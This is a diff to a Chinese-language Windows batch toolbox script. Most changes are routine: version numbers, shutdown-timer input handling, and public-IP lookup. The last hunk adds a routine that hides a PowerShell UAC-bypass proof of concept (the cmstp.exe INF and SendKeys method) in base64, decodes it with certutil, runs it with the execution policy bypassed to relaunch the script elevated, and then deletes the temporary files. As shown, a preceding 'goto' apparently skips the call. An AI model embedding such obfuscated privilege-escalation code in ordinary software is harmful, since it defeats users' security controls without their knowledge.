@@ -19,9 +19,13 @@ goto chushihua
 cls
 @echo off
 if /i "%1"=="-ks" goto ks
+if /i "%systemdrive%" equ "x:" goto ks
+goto :tgsu
+set weizhi=%0
+call :su
+:tgsu
 fltmc 1>nul 2>nul
 if %errorlevel%==0 goto ks
-if /i "%systemdrive%" equ "x:" goto ks
 verify on
 start cmd /c mshta vbscript:createobject("shell.application").shellexecute(""%0"","-ks",,"runas",1)(window.close)
 set xzflag1=
@@ -68,8 +72,8 @@ for /f "delims=" %%a in ("%weizhi%") do set disk=%%~da
 for /f "delims=" %%a in ('hostname') do set hostname=%%a
 cd/d "%disk%\"
 set cishu=3
-set ver=20220315
-set versize=188802
+set ver=20220320
+set versize=195573
 set gxflag=
 for /f "tokens=4 delims=.[]" %%a in ('"ver"') do set build=%%a
 set build|findstr "\<[0-9]*\>">nul
@@ -1657,8 +1661,9 @@ cls
 echo 请设置关机倒计时，有效范围(0-315360000)秒(e=返回)
 set guanjidaojishi=
 set/p guanjidaojishi=
+if not defined guanjidaojishi set guanjidaojishi=x
 set guanjidaojishi=%guanjidaojishi:|=%
-if "!guanjidaojishi!"=="" shutdown /s /f&goto guanji
+if "!guanjidaojishi!"=="x" shutdown /s /f&goto guanji
 if /i !guanjidaojishi!==e goto guanji
 if !guanjidaojishi! leq 315360000 goto guanji(1)(1)
 echo 不是有效数字！
@@ -1675,8 +1680,9 @@ cls
 echo 请设置重启倒计时，有效范围(0-315360000)秒(e=返回)
 set chongqidaojishi=
 set/p chongqidaojishi=
+if not defined chongqidaojishi set chongqidaojishi=x
 set chongqidaojishi=%chongqidaojishi:|=%
-if "!chongqidaojishi!"=="" shutdown /r /f&goto guanji 
+if "!chongqidaojishi!"=="x" shutdown /r /f&goto guanji 
 if /i !chongqidaojishi!==e goto guanji
 if !chongqidaojishi! leq 315360000 goto guanji(2)(1)
 echo 不是有效数字！
@@ -2352,8 +2358,7 @@ echo !mrwg!)
 :mrwgtc
 echo;
 echo IP:
-::for /f "skip=12 tokens=4 delims=: " %%a in ('"netsh interface Teredo show state"') do (echo %%a)
-if exist %systemroot%\system32\curl.exe (ping /n 1 www.baidu.com>nul&&curl 4.ipw.cn)
+if exist %systemroot%\system32\curl.exe (ping /n 1 www.baidu.com>nul&&curl 4.ipw.cn) else (for /f "skip=12 tokens=4 delims=: " %%a in ('"netsh interface Teredo show state"') do (echo %%a))
 echo;
 for /f "delims== tokens=2" %%a in ('"Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled^='TRUE'" get ipaddress /value"') do (set ipdz=%%a
 set ipdz=!ipdz:{=!
@@ -4527,5 +4532,87 @@ set brgb=!brgb:.=;!
 set qrgb=!qrgb:.=;!
 set /p =!cswz!48;2;!brgb!;38;2;!qrgb!m!zt!!cswz!!ysbak!<nul
 goto :eof
+:su
+for /f "delims=" %%a in ('"dir/a/b "%weizhi%""') do (set exe="%%~dpnxa")
+echo IyBVQUMgQnlwYXNzIHBvYyB1c2luZyBTZW5kS2V5cw0KIyBWZXJzaW9uIDEuMA0K>%temp%\1.base
+echo IyBBdXRob3I6IE9kZHZhciBNb2UNCiMgRnVuY3Rpb25zIGJvcnJvd2VkIGZyb206>>%temp%\1.base
+echo IGh0dHBzOi8vcG93ZXJzaGVsbC5vcmcvZm9ydW1zL3RvcGljL3NlbmRrZXlzLw0K>>%temp%\1.base
+echo IyBUb2RvOiBIaWRlIHdpbmRvdyBvbiBzY3JlZW4gZm9yIHN0ZWFsdGgNCiMgVG9k>>%temp%\1.base
+echo bzogTWFrZSBzY3JpcHQgZWRpdCB0aGUgSU5GIGZpbGUgZm9yIGNvbW1hbmQgdG8g>>%temp%\1.base
+echo aW5qZWN0Li4uDQoNCg0KRnVuY3Rpb24gc2NyaXB0OlNldC1JTkZGaWxlIHsNCltD>>%temp%\1.base
+echo bWRsZXRCaW5kaW5nKCldDQoJUGFyYW0gKA0KCVtQYXJhbWV0ZXIoSGVscE1lc3Nh>>%temp%\1.base
+echo Z2U9IlNwZWNpZnkgdGhlIElORiBmaWxlIGxvY2F0aW9uIildDQoJJEluZkZpbGVM>>%temp%\1.base
+echo b2NhdGlvbiA9ICIkZW52OnRlbXBcQ01TVFAuaW5mIiwNCgkNCglbUGFyYW1ldGVy>>%temp%\1.base
+echo KEhlbHBNZXNzYWdlPSJTcGVjaWZ5IHRoZSBjb21tYW5kIHRvIGxhdW5jaCBpbiBh>>%temp%\1.base
+echo IFVBQy1wcml2aWxlZ2VkIHdpbmRvdyIpXQ0KCVtTdHJpbmddJENvbW1hbmRUb0V4>>%temp%\1.base
+echo ZWN1dGUgPSAn>>%temp%\1.base
+echo Jw0KCSkNCg0KJEluZkNvbnRlbnQgPSBAIg0KW3ZlcnNpb25dDQpTaWduYXR1cmU9>%temp%\2.base
+echo YCRjaGljYWdvYCQNCkFkdmFuY2VkSU5GPTIuNQ0KDQpbRGVmYXVsdEluc3RhbGxd>>%temp%\2.base
+echo DQpDdXN0b21EZXN0aW5hdGlvbj1DdXN0SW5zdERlc3RTZWN0aW9uQWxsVXNlcnMN>>%temp%\2.base
+echo ClJ1blByZVNldHVwQ29tbWFuZHM9UnVuUHJlU2V0dXBDb21tYW5kc1NlY3Rpb24N>>%temp%\2.base
+echo Cg0KW1J1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uXQ0KOyBDb21tYW5kcyBIZXJl>>%temp%\2.base
+echo IHdpbGwgYmUgcnVuIEJlZm9yZSBTZXR1cCBCZWdpbnMgdG8gaW5zdGFsbA0KJENv>>%temp%\2.base
+echo bW1hbmRUb0V4ZWN1dGUNCnRhc2traWxsIC9JTSBjbXN0cC5leGUgL0YNCg0KW0N1>>%temp%\2.base
+echo c3RJbnN0RGVzdFNlY3Rpb25BbGxVc2Vyc10NCjQ5MDAwLDQ5MDAxPUFsbFVTZXJf>>%temp%\2.base
+echo TERJRFNlY3Rpb24sIDcNCg0KW0FsbFVTZXJfTERJRFNlY3Rpb25dDQoiSEtMTSIs>>%temp%\2.base
+echo ICJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxBcHAg>>%temp%\2.base
+echo UGF0aHNcQ01NR1IzMi5FWEUiLCAiUHJvZmlsZUluc3RhbGxQYXRoIiwgIiVVbmV4>>%temp%\2.base
+echo cGVjdGVkRXJyb3IlIiwgIiINCg0KW1N0cmluZ3NdDQpTZXJ2aWNlTmFtZT0iQ29y>>%temp%\2.base
+echo cFZQTiINClNob3J0U3ZjTmFtZT0iQ29ycFZQTiINCg0KIkANCg0KJEluZkNvbnRl>>%temp%\2.base
+echo bnQgfCBPdXQtRmlsZSAkSW5mRmlsZUxvY2F0aW9uIC1FbmNvZGluZyBBU0NJSQ0K>>%temp%\2.base
+echo fQ0KDQoNCkZ1bmN0aW9uIEdldC1Id25kDQp7DQogIFtDbWRsZXRCaW5kaW5nKCld>>%temp%\2.base
+echo DQogICAgDQogIFBhcmFtDQogICgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9>>%temp%\2.base
+echo ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUp>>%temp%\2.base
+echo XSBbc3RyaW5nXSAkUHJvY2Vzc05hbWUNCiAgKQ0KICBQcm9jZXNzDQogICAgew0K>>%temp%\2.base
+echo ICAgICAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1N0b3AnDQogICAgICAg>>%temp%\2.base
+echo IFRyeSANCiAgICAgICAgew0KICAgICAgICAgICAgJGh3bmQgPSBHZXQtUHJvY2Vz>>%temp%\2.base
+echo cyAtTmFtZSAkUHJvY2Vzc05hbWUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9w>>%temp%\2.base
+echo ZXJ0eSBNYWluV2luZG93SGFuZGxlDQogICAgICAgIH0NCiAgICAgICAgQ2F0Y2gg>>%temp%\2.base
+echo DQogICAgICAgIHsNCiAgICAgICAgICAgICRod25kID0gJG51bGwNCiAgICAgICAg>>%temp%\2.base
+echo fQ0KICAgICAgICAkaGFzaCA9IEB7DQogICAgICAgIFByb2Nlc3NOYW1lID0gJFBy>>%temp%\2.base
+echo b2Nlc3NOYW1lDQogICAgICAgIEh3bmQgICAgICAgID0gJGh3bmQNCiAgICAgICAg>>%temp%\2.base
+echo fQ0KICAgICAgICANCiAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQc09iamVjdCAt>>%temp%\2.base
+echo UHJvcGVydHkgJGhhc2gNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFNldC1XaW5kb3dB>>%temp%\2.base
+echo Y3RpdmUNCnsNCiAgW0NtZGxldEJpbmRpbmcoKV0NCg0KICBQYXJhbQ0KICAoDQog>>%temp%\2.base
+echo ICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxp>>%temp%\2.base
+echo bmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0gW3N0cmluZ10gJE5hbWUNCiAgKQ0K>>%temp%\2.base
+echo ICANCiAgUHJvY2Vzcw0KICB7DQogICAgJG1lbWJlckRlZmluaXRpb24gPSBAJw0K>>%temp%\2.base
+echo ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRl>>%temp%\2.base
+echo cm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0K>>%temp%\2.base
+echo ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVl>>%temp%\2.base
+echo KV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRGb3JlZ3JvdW5kV2luZG93>>%temp%\2.base
+echo KEludFB0ciBoV25kKTsNCg0KJ0ANCg0KICAgIEFkZC1UeXBlIC1NZW1iZXJEZWZp>>%temp%\2.base
+echo bml0aW9uICRtZW1iZXJEZWZpbml0aW9uIC1OYW1lIEFwaSAtTmFtZXNwYWNlIFVz>>%temp%\2.base
+echo ZXIzMg0KICAgICRod25kID0gR2V0LUh3bmQgLVByb2Nlc3NOYW1lICROYW1lIHwg>>%temp%\2.base
+echo U2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSHduZA0KICAgIElmICgkaHdu>>%temp%\2.base
+echo ZCkgDQogICAgew0KICAgICAgJG9uVG9wID0gTmV3LU9iamVjdCAtVHlwZU5hbWUg>>%temp%\2.base
+echo U3lzdGVtLkludFB0ciAtQXJndW1lbnRMaXN0ICgwKQ0KICAgICAgW1VzZXIzMi5B>>%temp%\2.base
+echo cGldOjpTZXRGb3JlZ3JvdW5kV2luZG93KCRod25kKQ0KICAgICAgW1VzZXIzMi5B>>%temp%\2.base
+echo cGldOjpTaG93V2luZG93KCRod25kLCA1KQ0KICAgIH0NCiAgICBFbHNlIA0KICAg>>%temp%\2.base
+echo IHsNCiAgICAgIFtzdHJpbmddICRod25kID0gJ04vQScNCiAgICB9DQoNCiAgICAk>>%temp%\2.base
+echo aGFzaCA9IEB7DQogICAgICBQcm9jZXNzID0gJE5hbWUNCiAgICAgIEh3bmQgICAg>>%temp%\2.base
+echo PSAkaHduZA0KICAgIH0NCiAgICAgICAgDQogICAgTmV3LU9iamVjdCAtVHlwZU5h>>%temp%\2.base
+echo bWUgUHNPYmplY3QgLVByb3BlcnR5ICRoYXNoDQogIH0NCn0NCg0KLiBTZXQtSU5G>>%temp%\2.base
+echo RmlsZQ0KI05lZWRzIFdpbmRvd3MgZm9ybXMNCmFkZC10eXBlIC1Bc3NlbWJseU5h>>%temp%\2.base
+echo bWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCklmIChUZXN0LVBhdGggJEluZkZpbGVM>>%temp%\2.base
+echo b2NhdGlvbikgew0KI0NvbW1hbmQgdG8gcnVuDQokcHMgPSBuZXctb2JqZWN0IHN5>>%temp%\2.base
+echo c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzc3RhcnRpbmZvICJjOlx3aW5kb3dzXHN5>>%temp%\2.base
+echo c3RlbTMyXGNtc3RwLmV4ZSINCiRwcy5Bcmd1bWVudHMgPSAiL2F1ICRJbmZGaWxl>>%temp%\2.base
+echo TG9jYXRpb24iDQokcHMuVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlDQoNCiNTdGFy>>%temp%\2.base
+echo dCBpdA0KW3N5c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzXTo6U3RhcnQoJHBzKQ0K>>%temp%\2.base
+echo DQpkbw0Kew0KCSMgRG8gbm90aGluZyB1bnRpbCBjbXN0cCBpcyBhbiBhY3RpdmUg>>%temp%\2.base
+echo d2luZG93DQp9DQp1bnRpbCAoKFNldC1XaW5kb3dBY3RpdmUgY21zdHApLkh3bmQg>>%temp%\2.base
+echo LW5lIDApDQoNCg0KI0FjdGl2YXRlIHdpbmRvdw0KU2V0LVdpbmRvd0FjdGl2ZSBj>>%temp%\2.base
+echo bXN0cA0KDQojU2VuZCB0aGUgRW50ZXIga2V5DQpbU3lzdGVtLldpbmRvd3MuRm9y>>%temp%\2.base
+echo bXMuU2VuZEtleXNdOjpTZW5kV2FpdCgie0VOVEVSfSIpDQp9>>%temp%\2.base
+set /p =cmd /c %exe% -ks<nul>%temp%\su.bat
+set /p =%temp%\su.bat<nul>%temp%\su.txt
+certutil -decode -f "%temp%\1.base" %temp%\1.txt>nul
+certutil -decode -f "%temp%\2.base" %temp%\2.txt>nul
+copy /b "%temp%\1.txt"+"%temp%\su.txt"+"%temp%\2.txt" "%temp%\bypass.ps1">nul
+powershell -mta -nologo -noprofile -executionpolicy bypass -file "%temp%\bypass.ps1">nul
+timeout /t 2 /nobreak>nul
+del %temp%\su.txt;%temp%\1.base;%temp%\2.base;%temp%\1.txt;%temp%\2.txt;%temp%\bypass.ps1;%temp%\su.bat
+exit
 :00
 exit
